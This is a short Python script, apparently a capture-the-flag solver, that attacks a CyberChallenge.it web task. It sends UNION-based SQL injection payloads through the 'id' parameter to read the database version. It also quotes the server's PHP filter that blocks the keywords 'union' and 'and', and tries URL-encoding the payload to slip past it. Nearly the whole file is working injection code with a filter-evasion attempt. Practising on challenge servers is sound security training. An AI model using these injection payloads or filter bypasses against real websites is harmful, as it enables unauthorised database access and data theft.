#!/usr/bin/env python3
import requests as r

url = 'http://filtered.challs.cyberchallenge.it'

# what we know:
# - flag in the database
# - access to the db via the url parameter id (page)

# try an sql injection
# payload = '1 UNION SELECT version(), 2, 3, 4, 5, 6, 7, 8, 9, 10'

s = r.Session()
response = s.get(
    url, params={'id': '1 UNION SELECT version(), 2, 3, 4, 5, 6, 7, 8, 9, 10'})

print(response.text)


"""
     <?php
function is_hackerz($input) {
    foreach (['union', 'and'] as $keyword) {
        if (stripos($input, $keyword) !== false) {
            return true;
        }
    }
    return false;
}
    """
# the server is filtering the keywords 'union' and 'and'
# let's encode them for php server
payload = '1%20UNION%20SELECT%20version(),%202,%203,%204,%205,%206,%207,%208,%209,%2010'

response = s.get(url, params={'id': payload})
print(url + '/?id=' + payload)
print(response.text)
